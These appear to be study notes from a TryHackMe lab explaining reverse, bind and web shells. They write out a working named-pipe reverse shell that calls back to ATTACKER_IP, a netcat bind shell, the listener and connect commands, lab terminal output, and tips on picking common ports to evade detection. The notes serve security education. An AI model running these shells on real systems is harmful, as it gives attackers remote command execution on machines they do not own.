### How Reverse Shells work
##### First, we set up a nc listener
```shell-session
attacker@kali:~$ nc -lvnp 443
listening on [any] 4444 ...
```

-l = wait for a connection
-v = verbose mode
-n = prevents connections from DNS for lookup, it will not resolve hostnames it will only use an IP address
-p = especify the used port (generally we use known ports in order to try to dodge being detected, such as 53, 80, 8080, 443, 139 or 445)

##### Secondly, we try to gain reverse shell access
As an example, let's analyze an example payload named a **pipe reverse shell**, as shown below.

`rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f`

**Explanation of the Payload**

- `rm -f /tmp/f` - This command removes any existing named pipe file located at `/tmp/f/`. This ensures that the script can create a new named pipe without conflicts.
- `mkfifo /tmp/f` - This command creates a named pipe, or FIFO (first-in, first-out), at `/tmp/f`. Named pipes allow for two-way communication between processes. In this context, it acts as a conduit for input and output.
- `cat /tmp/f` - This command reads data from the named pipe. It waits for input that can be sent through the pipe.
- `| bash -i 2>&1` - The output of `cat` is piped to a shell instance (`bash -i`), which allows the attacker to execute commands interactively. The `2>&1` redirects standard error to standard output, ensuring that error messages are sent back to the attacker.
- `| nc ATTACKER_IP ATTACKER_PORT >/tmp/f` - This part pipes the shell's output through `nc` (Netcat) to the attacker's IP address (`ATTACKER_IP`) on the attacker's port (`ATTACKER_PORT`).
- `>/tmp/f` -This final part sends the output of the commands back into the named pipe, allowing for bi-directional communication.

##### the last step: the attacker receives the shell
Once the above payload is executed, we receive a reverse shell, allowing us to eexecute commands as if we were logged inside a regular terminal in the system

```shell-session
attacker@kali:~$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.4.99.209] from (UNKNOWN) [10.10.13.37] 59964
To run a command as administrator (user "root"), use "sudo ".
See "man sudo_root" for details.

target@tryhackme:~$
```
---

### Bind Shell
A bind shell will bind a port on the compromised system and listen for a connection, when this connection occurs, it exposes the shell session so the ataccker can execute commands remotely
It can be used when the target does not allow outgoing connections, but it is usually less popular since it needs to remain active and listen for connections, which can sometimes lead to being detected more easily

**Setting Up the Bind Shell on the Target**

Let's create a bind shell. In this case, the attacker can use a command like the one below on the target machine.

`rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f`

**Explanation of the Payload**

- `rm -f /tmp/f` - This command removes any existing named pipe file located at `/tmp/f/`. This ensures that the script can create a new named pipe without conflicts.
- `mkfifo /tmp/f` - This command creates a named pipe, or FIFO, at `/tmp/f`. Named pipes allow for two-way communication between processes. In this context, it acts as a conduit for input and output.
- `cat /tmp/f` - This command reads data from the named pipe. It waits for input that can be sent through the pipe.
- `| bash -i 2>&1` - The output of `cat` is piped to a shell instance (`bash -i`), which allows the attacker to execute commands interactively. The `2>&1` redirects standard error to standard output, ensuring error messages are returned to the attacker.
- **`| nc -l 0.0.0.0 8080`** - Starts Netcat in listen mode (`-l`) on all interfaces (`0.0.0.0`) and port `8080`. The shell will be exposed to the attacker once they connect to this port.
- `>/tmp/f` This final part sends the commands' output back into the named pipe, allowing for bidirectional communication.

The command above will listen for incoming connections and expose a bash shell. We need to note that ports below 1024 will require Netcat to be executed with elevated privileges. In this case, using port 8080 will avoid this.

**Terminal on the Target Machine (Bind Shell Setup)**

```shell-session
target@tryhackme:~$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f
```

Once the command is executed, it will wait for an incoming connection, as shown above.

**Attacker Connects to the Bind Shell**

Now that the target machine is waiting for incoming connections, we can use Netcat again with the following command to connect.

`nc -nv TARGET_IP 8080`

**Explanation of the command**

- `nc` - This invokes Netcat, which establishes the connection to the target.
- `-n` - Disables DNS resolution, allowing Netcat to operate faster and avoid unnecessary lookups.
- `-v` - Verbose mode provides detailed output of the connection process, such as when the connection is established.
- `TARGET_IP` - The IP address of the target machine where the bind shell is running.
- `8080` - The port number on which the bind shell listens.

**Attacker Terminal (After Connection)**

Terminal

```shell-session
attacker@kali:~$ nc -nv 10.10.13.37 8080 
(UNKNOWN) [10.10.13.37] 8080 (http-alt) open
target@tryhackme:~$
```

After connecting, we can get a shell, as shown above, and execute commands.

## Web Shell

a script written in a language supported by a compromised web server that executes commands through the web server itself. Usually a file containing the code that executes commands and handles files